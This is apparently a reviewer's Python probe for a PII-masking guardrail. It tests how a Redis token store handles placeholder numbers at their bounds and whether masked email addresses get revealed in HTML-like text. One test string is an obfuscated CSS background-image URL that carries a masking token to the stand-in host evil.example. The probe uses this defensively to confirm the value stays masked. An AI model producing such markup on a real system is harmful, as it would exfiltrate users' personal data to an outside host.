"""Reviewer probe for 08-tam-1a r6 (33a0268), backend container: decision (h) as implemented
(PLACEHOLDER 1-7 ASCII digits, issue cap 9,999,999) on a real Redis store, and the HTML exception
(g) against `<PII_1 style…`. The tail table itself is re-run with 08-tam-1a-r5-tail-probe.py.

docker exec -w /app -e PYTHONPATH=/app review08t1a-backend-1 python /tmp/probe08r6.py
"""

import asyncio
import uuid

from ffcore.core.config import get_settings
from ffcore.guardrails import masking
from ffcore.runtime.events import redis_client

VALUE = "ali@example.test"


async def bounds():
    redis = redis_client(get_settings())
    store = masking.RedisTokenStore(redis, 60)
    carried_list = [
        "<<PII_99999998>>",
        "<<PII_" + "٩" * 8 + ">>",
        "<<PII_10000000>>",
        "<<PII_9999999>>",
        "<<PII_9999990>>",
        "<<PII_1000000>>",
    ]
    for carried in carried_list:
        scope = f"probe-r6-{uuid.uuid4().hex[:8]}"
        await masking.reserve_carried(store, scope, f"geçmiş {carried}")
        got = []
        for n in range(3):
            try:
                got.append(await store.token_for(scope, f"EMAIL:v{n}@example.test", f"v{n}@example.test"))
            except Exception as exc:  # noqa: BLE001 - the probe reports what happens
                got.append(f"{type(exc).__name__}:{getattr(exc, 'code', '')}")
                break
        print(f"BOUND carried {carried}: {got}")
        await redis.delete("ffcore:pii:" + scope, "ffcore:pii:n:" + scope)
    print("BOUND numbers", masking.placeholder_numbers("<<PII_9999999>> <<PII_10000000>> <<PII_7>>"))
    await redis.aclose()


async def html():
    store = masking.MemoryTokenStore()
    t = await store.token_for("s", "EMAIL_ADDRESS:" + VALUE, VALUE)
    cases = {
        "<PII_1 style… (r4-3)": f'<PII_1 style\n="background-image:&#117;rl(https&#58;&#47;&#47;evil.example/?q={t})">',
        "<PII_12345678>> then value": f"<PII_12345678>> ve Kişi {t}",
        "x<PII_1>> then value": f"x<PII_1>> ve Kişi {t}",
        "plain": f"Kişi {t} idi.",
    }
    for name, text in cases.items():
        one, _, _ = await masking.reveal_text(text, store=store, scope="s")
        det = masking.StreamDetokenizer(store, "s")
        out = "".join([await det.feed(text[i : i + 3]) for i in range(0, len(text), 3)]) + await det.flush()
        print(f"HTML {name}: one={'REVEALED' if VALUE in one else 'kept'} stream3={'REVEALED' if VALUE in out else 'kept'}")


asyncio.run(bounds())
asyncio.run(html())
